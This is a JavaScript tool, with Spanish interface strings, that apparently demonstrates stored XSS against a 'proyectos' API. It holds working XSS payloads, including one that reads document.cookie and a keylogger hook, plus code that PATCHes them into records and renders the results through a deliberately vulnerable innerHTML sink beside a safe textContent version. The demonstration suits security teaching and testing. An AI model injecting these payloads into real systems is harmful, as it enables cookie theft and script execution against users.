const PAYLOADS = {
  alert: `<img src=x onerror="alert('XSS ejecutado! dominio: '+document.domain)">`,
  cookie: `<img src=x onerror="alert('COOKIES: '+document.cookie)">`,
  domain: `<img src=x onerror="alert('URL: '+location.href+'\\nDomain: '+document.domain)">`,
  svg: `<svg onload="alert('SVG XSS — '+document.domain)"></svg>`,
  img: `<img src=x onerror=alert(document.domain)>`,
  keylog: `<img src=x onerror="document.onkeypress=function(e){console.log('KEY:'+e.key)};alert('Keylogger activo')">`,
};

function setPayload(type) {
  document.getElementById('nombre').value = PAYLOADS[type];
  document.getElementById('descripcion').value = PAYLOADS[type];
  log('info', `Payload cargado: ${type}`);
}

function ts() {
  return new Date().toTimeString().slice(0, 8);
}

function log(type, msg) {
  const el = document.getElementById('log');
  const div = document.createElement('div');
  div.className = 'log-entry';
  div.innerHTML = `<span class="log-ts">${ts()}</span><span class="log-${type}">${msg}</span>`;
  el.appendChild(div);
  el.scrollTop = el.scrollHeight;
}

function clearLog() {
  document.getElementById('log').innerHTML = '';
  log('info', 'Log limpiado');
}

function setStatus(ok, text) {
  document.getElementById('statusDot').className = `dot ${ok ? 'ok' : 'err'}`;
  document.getElementById('statusText').textContent = text;
}

function getHeaders() {
  const token = document.getElementById('token').value.trim();
  return {
    'Content-Type': 'application/json',
    Authorization: `Bearer ${token}`,
  };
}

async function sendPayload() {
  const base = document.getElementById('baseUrl').value.trim();
  const id = document.getElementById('proyectoId').value.trim();
  const nombre = document.getElementById('nombre').value;
  const descripcion = document.getElementById('descripcion').value;

  log('info', `PATCH ${base}/proyectos/${id}`);
  log('warn', `Payload nombre: ${nombre.slice(0, 60)}...`);

  try {
    const res = await fetch(`${base}/proyectos/${id}`, {
      method: 'PATCH',
      headers: getHeaders(),
      body: JSON.stringify({ nombre, descripcion }),
    });

    const data = await res.json();

    if (res.ok && data.finalizado) {
      setStatus(true, `PATCH ${res.status} OK`);
      log('ok', `✓ Payload almacenado en DB — ${JSON.stringify(data.mensaje)}`);
      log('ok', `  id proyecto: ${data.datos?.id}`);
      setTimeout(() => getAndRender(), 500);
    } else {
      setStatus(false, `PATCH ${res.status}`);
      log('err', `✗ Error: ${JSON.stringify(data)}`);
    }
  } catch (e) {
    setStatus(false, 'error de red');
    log('err', `✗ Fetch error: ${e.message}`);
    log('warn', '  → Si es CORS: abre este archivo desde el mismo origen (localhost)');
    log('warn', `  → Si es SSL: acepta el certificado primero en ${base}`);
  }
}

async function getAndRender() {
  const base = document.getElementById('baseUrl').value.trim();
  const id = document.getElementById('proyectoId').value.trim();

  log('info', `GET ${base}/proyectos/${id}`);

  try {
    const res = await fetch(`${base}/proyectos/${id}`, {
      method: 'GET',
      headers: getHeaders(),
    });

    const data = await res.json();

    if (res.ok && data.finalizado) {
      setStatus(true, `GET ${res.status} OK`);
      const { nombre, descripcion } = data.datos;

      log('ok', '✓ Datos recuperados de DB');
      log('warn', `  nombre raw: ${nombre}`);
      log('warn', `  descripcion raw: ${descripcion}`);

      const vulnN = document.getElementById('renderVulnNombre');
      const vulnD = document.getElementById('renderVulnDesc');
      vulnN.innerHTML = nombre;
      vulnD.innerHTML = descripcion;
      vulnN.classList.add('xss-triggered');
      vulnD.classList.add('xss-triggered');
      setTimeout(() => {
        vulnN.classList.remove('xss-triggered');
        vulnD.classList.remove('xss-triggered');
      }, 1500);

      document.getElementById('renderSafeNombre').textContent = nombre;
      document.getElementById('renderSafeDesc').textContent = descripcion;

      log('err', '⚠ XSS activado via innerHTML — ver zonas rojas');
      log('ok', '✓ textContent escapa correctamente — ver zonas verdes');
    } else {
      setStatus(false, `GET ${res.status}`);
      log('err', `✗ Error al recuperar: ${JSON.stringify(data)}`);
    }
  } catch (e) {
    setStatus(false, 'error de red');
    log('err', `✗ Fetch error: ${e.message}`);
  }
}
